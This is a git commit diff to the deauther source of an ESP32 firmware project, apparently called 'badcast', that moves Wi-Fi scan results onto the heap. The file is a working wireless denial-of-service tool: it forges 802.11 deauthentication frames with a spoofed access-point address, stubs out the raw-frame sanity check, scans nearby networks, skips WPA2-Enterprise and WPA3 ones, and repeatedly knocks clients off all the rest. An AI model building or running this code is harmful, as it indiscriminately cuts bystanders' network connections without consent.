731868a3c12059b1a277b88e2fc2d754022a380c
zry98 <dev@zry.io>
2022-12-05 10:05:12 +0100

    fix scanner memory issue by storing results on heap

--- src/deauther.c
+++ src/deauther.c
@@ -19,12 +19,26 @@ static const char *TAG = "badcast_deauther";
  * 
  * @see Reason code ref: 802.11-2016 [9.4.1.7; Table 9-45]
  */
-static const uint8_t deauthFrameDefault[] = {
-    0xc0, 0x00, 0x3a, 0x01,
-    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0xf0, 0xff, 0x02, 0x00
+static uint8_t deauthFrame[] = {
+    0xc0, 0x00,                          // type, subtype 0xc0: deauth (0xa0: disassociate)
+    0x3a, 0x01,                          // duration
+    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,  // destination MAC (0xffffff: broadcast)
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // transmitter MAC (set later)
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // source MAC (set later)
+    0xf0, 0xff,                          // fragment & squence number
+    0x02, 0x00                           // reason code (0x02: Previous authentication no longer valid)
+};
+
+static const int deauthFrameSize = sizeof(deauthFrame);
+
+static const wifi_scan_config_t scanConfig = {
+    .ssid = NULL,
+    .bssid = NULL,
+    .channel = 0,
+    .show_hidden = true,  // we only need to know MAC
+    .scan_type = WIFI_SCAN_TYPE_ACTIVE,
+    .scan_time.active.min = 100,
+    .scan_time.active.max = 300,
 };
 
 /**
@@ -38,58 +52,25 @@ int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3)
     return 0;
 }
 
-typedef struct {
-    uint8_t bssid[6];                     /**< MAC address of AP */
-    uint8_t primary;                      /**< channel of AP */
-    wifi_second_chan_t second;            /**< secondary channel of AP */
-} ap_record;  // lite version of wifi_ap_record_t
-
-void send_deauth_frame(ap_record *target)
+void send_deauth_frame(wifi_ap_record_t *target)
 {
-    // clone BSSID and channels first
+    // kick all connected stations off
+    ESP_ERROR_CHECK(esp_wifi_deauth_sta(0));
+    // clone BSSID and channel
     ESP_ERROR_CHECK(esp_wifi_set_mac(WIFI_IF_STA, target->bssid));
     ESP_ERROR_CHECK(esp_wifi_set_channel(target->primary, target->second));
-
-    uint8_t deauthFrame[sizeof(deauthFrameDefault)];
-    memcpy(deauthFrame, deauthFrameDefault, sizeof(deauthFrameDefault));
+    // forge frame
     memcpy(&deauthFrame[10], target->bssid, 6);
     memcpy(&deauthFrame[16], target->bssid, 6);
 
     for (uint8_t i = 0; i < 5; i++) {
-        esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrameDefault), false);
+        esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, deauthFrameSize, false);
         if (ret) {
             ESP_LOGW(TAG, "failed to send deauth frame, err: %d", ret);
             return;
         }
     }
     ESP_LOGI(TAG, "sent deauth frames as "MACSTR, MAC2STR(target->bssid));
-}
-
-#define DEFAULT_SCAN_LIST_SIZE 6  // out of memory if > 6
-
-uint8_t scan_ap(ap_record *targets)
-{
-    uint16_t number = DEFAULT_SCAN_LIST_SIZE;
-    wifi_ap_record_t apInfo[DEFAULT_SCAN_LIST_SIZE];
-    uint16_t apCount = 0;
-    memset(apInfo, 0, sizeof(apInfo));
-
-    esp_wifi_scan_start(NULL, true);
-    ESP_ERROR_CHECK(esp_wifi_scan_get_ap_records(&number, apInfo));
-    ESP_ERROR_CHECK(esp_wifi_scan_get_ap_num(&apCount));
-    esp_wifi_scan_stop();
-
-    uint8_t attackableCount = 0;
-    for (int i = 0; (i < DEFAULT_SCAN_LIST_SIZE) && (i < apCount); i++) {
-        if (apInfo[i].authmode == WIFI_AUTH_WPA2_ENTERPRISE ||
-            apInfo[i].authmode == WIFI_AUTH_WPA3_PSK) continue;  // skip secured ones
-        memcpy(targets[attackableCount].bssid, apInfo[i].bssid, 6);
-        targets[attackableCount].primary = apInfo[i].primary;
-        targets[attackableCount].second = apInfo[i].second;
-        attackableCount++;
-    }
-    ESP_LOGI(TAG, "attackable APs = %u / %u", attackableCount, apCount);
-    return attackableCount;
 }
 
 void deauth(void *arg)
@@ -100,17 +81,32 @@ void deauth(void *arg)
         wifi_second_chan_t chSecond;
         ESP_ERROR_CHECK(esp_wifi_get_channel(&chPrimary, &chSecond));
 
-        ap_record targets[DEFAULT_SCAN_LIST_SIZE];
-        uint8_t apCount = scan_ap(targets);
-        for (uint8_t i = 0; (i < DEFAULT_SCAN_LIST_SIZE) && (i < apCount); i++) {
-            send_deauth_frame(&targets[i]);
+        // scan for nearby APs
+        ESP_ERROR_CHECK(esp_wifi_scan_start(&scanConfig, true));
+        uint16_t apCount = 0;
+        ESP_ERROR_CHECK(esp_wifi_scan_get_ap_num(&apCount));
+        ESP_LOGI(TAG, "found %u APs", apCount);
+
+        if (apCount > 0) {
+            ESP_LOGD(TAG, "free heap: %u", esp_get_free_heap_size());
+            wifi_ap_record_t *apList = malloc(apCount * sizeof(wifi_ap_record_t));
+            ESP_ERROR_CHECK(esp_wifi_scan_get_ap_records(&apCount, apList));
+            ESP_LOGD(TAG, "free heap: %u", esp_get_free_heap_size());
+
+            for (uint16_t i = 0; i < apCount; i++) {
+                if (apList[i].authmode == WIFI_AUTH_WPA2_ENTERPRISE ||
+                    apList[i].authmode == WIFI_AUTH_WPA3_PSK) continue;  // skip invulnerable ones
+                ESP_LOGI(TAG, "found attackable: %s ("MACSTR")", apList[i].ssid, MAC2STR(apList[i].bssid));
+                send_deauth_frame(&apList[i]);
+            }
+            free(apList);
         }
 
         // restore AP channel
         ESP_ERROR_CHECK(esp_wifi_set_channel(chPrimary, chSecond));
 
-        ESP_LOGI(TAG, "free heap: %u", esp_get_free_heap_size());
-        vTaskDelay(10000 / portTICK_PERIOD_MS);
+        ESP_LOGD(TAG, "free heap: %u", esp_get_free_heap_size());
+        vTaskDelay(20000 / portTICK_PERIOD_MS);
     }
 }
 
